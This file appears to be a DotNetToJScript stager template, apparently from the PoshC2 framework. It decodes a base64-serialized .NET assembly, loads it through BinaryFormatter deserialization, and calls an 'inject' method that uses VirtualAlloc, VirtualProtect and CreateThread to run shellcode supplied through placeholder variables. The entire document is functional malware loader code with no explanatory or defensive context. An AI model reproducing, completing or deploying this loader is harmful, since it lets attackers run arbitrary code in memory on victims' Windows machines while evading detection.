var safdsv64 = "#REPLACEME64#";
var safdsv32 = "#REPLACEME32#";

function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {WScript.Echo(s);}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVy"+
"ZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAA"+
"CQYAAAAJCQAAAAYRAAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0"+
"W10pBhIAAAAsU3lzdGVtLk9iamVjdCBEeW5hbWljSW52b2tlKFN5c3RlbS5PYmplY3RbXSkIAAAA"+
"CgELAAAAAgAAAAYTAAAAIFN5c3RlbS5YbWwuU2NoZW1hLlhtbFZhbHVlR2V0dGVyBhQAAABNU3lz"+
"dGVtLlhtbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2Vu"+
"PWI3N2E1YzU2MTkzNGUwODkGFQAAAAd0YXJnZXQwCQYAAAAGFwAAABpTeXN0ZW0uUmVmbGVjdGlv"+
"bi5Bc3NlbWJseQYYAAAABExvYWQKDwwAAAAAFgAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMg"+
"cHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDcYStd"+
"AAAAAAAAAADgACIgCwEwAAAOAAAABgAAAAAAAI4tAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAA"+
"AAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAA"+
"AAA8LQAATwAAAABAAAB4AwAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAABCwAABwAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAA"+
"AAAAAAAAAAAudGV4dAAAAJQNAAAAIAAAAA4AAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAAB4"+
"AwAAAEAAAAAEAAAAEAAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAABQAAAAA"+
"AAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAcC0AAAAAAABIAAAAAgAFAPggAAAMCwAAAQAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATMAYA"+
"kQAAAAEAABEUCigQAAAKGjMJAygRAAAKCisPKBAAAAoeMwcEKBEAAAoKfhIAAAoGjmkYWigTAAAK"+
"IAAQAAAaKAEAAAYLB34SAAAKKBQAAAosRhYMFg0GFgcGjmkoFQAACgcGjmkYWigTAAAKH0ASAigD"+
"AAAGJn4SAAAKFgd+EgAAChYSAygCAAAGJhYXcxYAAApvFwAACiYqHgIoGAAACioAAABCU0pCAQAB"+
"AAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAAD0AwAAI34AAGAEAADQBAAAI1N0cmluZ3MAAAAA"+
"MAkAAAQAAAAjVVMANAkAABAAAAAjR1VJRAAAAEQJAADIAQAAI0Jsb2IAAAAAAAAAAgAAAVcdAhQJ"+
"AgAAAPoBMwAWAAABAAAAGAAAAAQAAAAUAAAABQAAABAAAAAYAAAAEgAAABAAAAABAAAAAgAAAAMA"+
"AAABAAAAAQAAAAIAAAAAAHIDAQAAAAAABgBtAvkDBgDaAvkDBgCSAccDDwAZBAAABgC6AYwDBgBB"+
"AowDBgAiAowDBgDBAowDBgCNAowDBgCmAowDBgDRAYwDBgCmAdoDBgCEAdoDBgAFAowDBgDsASUD"+
"BgBkBIADBgBeAoADBgCHA4ADBgDAA4ADBgCzBIADBgBQA9oDBgBbARQDBgBMARQDBgBgARQDAAAA"+
"ABMAAAAAAAEAAQABABAAvQAAAEEAAQABAAIBAAB1AQAASQABAAYAAgEAAJ4DAABJAAkABgAGBhYB"+
"sQBWgNsAtABWgIsAtABWgNUAtABWgLEAtABWgJ8AtABWgKgAtABWgJMAtAAGBhYBuABWgMcAuwBW"+
"gOIAuwBWgFgAuwBWgPAAuwBWgH4AuwBWgBwAuwBWgGcAuwBWgP8AuwBWgC4AuwBWgDkAuwBWgEYA"+
"uwAAAAAAgACRICcBvwABAAAAAACAAJEgPwHJAAUAAAAAAIAAkSCBBNQACwBQIAAAAACGAGsE3gAP"+
"AO0gAAAAAIYYugMGABEAAAABAEsEAAACAA0DAAADAHMBAAAEAJAEAAABACgEAAACAAEDAAADAFUE"+
"AAAEAK4DAAAFADsEAgAGADQBAAABAEsEAAACAA0DAAADAJoEAgAEAHIEAAABAAEAAAACAAoACQC6"+
"AwEAEQC6AwYAGQC6AwoAKQC6AxAAMQC6AxAAOQC6AxAAQQC6AxAASQC6AxAAUQC6AxAAWQC6AxAA"+
"YQC6AxUAaQC6AxAAcQC6AxAAeQC6AxAAiQC6AwYAmQD4AiIAoQA/AyYAmQCpAywAmQCnBC8AmQDA"+
"BDQAqQC7BDoAsQC6A0MAwQBrAUoAgQC6AwYACQAIAFcACQAMAFwACQAQAGEACQAUAGYACQAYAGsA"+
"CQAcAHAACQAgAHUACAAoAHoACAAsAH8ACAAwAIQACAA0AIkACAA4AI4ACAA8AJMACABAAJgACABE"+
"AJ0ACABIAKIACABMAKcACABQAKwALgALAOQALgATAO0ALgAbAAwBLgAjABUBLgArACQBLgAzACQB"+
"LgA7ACQBLgBDABUBLgBLACoBLgBTACQBLgBbACQBLgBjAEIBLgBrAGwBLgBzAHkBQwBbAMEBYwB7"+
"AHoAGgBlA1gDQAEDACcBAQBGAQUAPwECAEABBwCBBAEABIAAAAEAAAAAAAAAAAAAAAAAvQAAAAQA"+
"AAAAAAAAAAAAAE4AHgEAAAAAAwACAAQAAgAAAAAAAHNhZmRzdjMyAHNhZmRzdjY0ADxNb2R1bGU+"+
"AFBBR0VfRVhFQ1VURV9SRUFEAFBBR0VfR1VBUkQAUEFHRV9OT0NBQ0hFAFBBR0VfV1JJVEVDT01C"+
"SU5FAFBBR0VfUkVBRFdSSVRFAFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUAUEFHRV9FWEVDVVRFAFJF"+
"U0VSVkUAV1JJVEVfV0FUQ0gAUEhZU0lDQUwAVE9QX0RPV04ATEFSR0VfUEFHRVMARG90TmV0MkpT"+
"AFBBR0VfTk9BQ0NFU1MAUkVTRVQAQ09NTUlUAFBBR0VfUkVBRE9OTFkAUEFHRV9XUklURUNPUFkA"+
"UEFHRV9FWEVDVVRFX1dSSVRFQ09QWQB2YWx1ZV9fAG1zY29ybGliAFZpcnR1YWxBbGxvYwBscFRo"+
"cmVhZElkAENyZWF0ZVRocmVhZABFdmVudFJlc2V0TW9kZQBFdmVudFdhaXRIYW5kbGUAV2FpdE9u"+
"ZQBmbEFsbG9jYXRpb25UeXBlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21W"+
"aXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtB"+
"dHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRy"+
"aWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25B"+
"dHRyaWJ1dGUARmxhZ3NBdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBB"+
"c3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1i"+
"bHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAGdldF9TaXpl"+
"AGR3U3RhY2tTaXplAGR3U2l6ZQBTeXN0ZW0uVGhyZWFkaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNp"+
"b25pbmcARnJvbUJhc2U2NFN0cmluZwBNYXJzaGFsAEtlcm5lbDMyLmRsbABrZXJuZWwzMi5kbGwA"+
"RG90TmV0MkpTLmRsbABTeXN0ZW0ARW51bQBTeXN0ZW0uUmVmbGVjdGlvbgBQcm90ZWN0aW9uAFpl"+
"cm8AbHBQYXJhbWV0ZXIALmN0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVu"+
"dGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1"+
"Z2dpbmdNb2RlcwBscFRocmVhZEF0dHJpYnV0ZXMAZHdDcmVhdGlvbkZsYWdzAGxwQWRkcmVzcwBs"+
"cFN0YXJ0QWRkcmVzcwBPYmplY3QAaW5qZWN0AGxwZmxPbGRQcm90ZWN0AFZpcnR1YWxQcm90ZWN0"+
"AGZsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAQ29udmVydABDb3B5AG9wX0luZXF1"+
"YWxpdHkAAAAAAAAAQLsrNtGJI0W7wAnTDgZDdwAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBwcE"+
"HQUYCQkDAAAIBQABHQUOAgYYBAABGAgFAAICGBgIAAQBHQUIGAgGIAIBAhFdAyAAAgi3elxWGTTg"+
"iQQAEAAABAAgAAAEAAAIAAQAAAAgBAAAQAAEAAAQAAQAACAABAEAAAAEAgAAAAQEAAAABAgAAAAE"+
"EAAAAAQgAAAABEAAAAAEgAAAAAQAAQAABAACAAAEAAQAAAIGCQMGEQwCBggDBhEQCQAEGBgYEQwR"+
"EAoABhgYCRgYCRAJCQAEAhgYERAQCQUgAgEODggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2Vw"+
"dGlvblRocm93cwEIAQACAAAAAAAOAQAJRG90TmV0MkpTAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKp"+
"ICAyMDE5AAApAQAkYWEzMTExMmQtMDlhMC00MzA5LWI5ZjctYjllZTI0MjFkN2NiAAAMAQAHMS4w"+
"LjAuMAAARwEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC4wAQBUDhRGcmFtZXdvcmtEaXNwbGF5"+
"TmFtZRAuTkVUIEZyYW1ld29yayA0BQEAAQAAAAAAAADcYStdAAAAAAIAAAAcAQAAICwAACAOAABS"+
"U0RTqX5eXBa20Ey3gV9N69pU9AEAAABaOlxEZXNrdG9wXGdpdFxQb3NoQzJfRExMU1xEb3ROZXQy"+
"SlNcRG90TmV0MkpTXG9ialxSZWxlYXNlXERvdE5ldDJKUy5wZGIAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGQt"+
"AAAAAAAAAAAAAH4tAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwLQAAAAAAAAAAAAAAAF9Db3JE"+
"bGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAA"+
"AAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAHAMAAAAAAAAAAAAAHAM0"+
"AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEA"+
"AAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBm"+
"AG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkA"+
"bgBnAEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBt"+
"AG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA8AAoA"+
"AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARABvAHQATgBlAHQAMgBKAFMAAAAw"+
"AAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA8AA4AAQBJAG4A"+
"dABlAHIAbgBhAGwATgBhAG0AZQAAAEQAbwB0AE4AZQB0ADIASgBTAC4AZABsAGwAAABIABIAAQBM"+
"AGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIA"+
"MAAxADkAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEQADgAB"+
"AE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABEAG8AdABOAGUAdAAyAEoAUwAuAGQA"+
"bABsAAAANAAKAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABEAG8AdABOAGUAdAAyAEoAUwAA"+
"ADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgA"+
"AQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACQPQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJGAAAAAkGAAAACRcAAAAGGwAAACdTeXN0ZW0u"+
"UmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGHAAAAC5TeXN0ZW0uUmVmbGVjdGlvbi5B"+
"c3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoL";
var entry_class = 'DotNet2JS';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	o.inject(safdsv32,safdsv64);
} catch (e) {
    debug(e.message);
}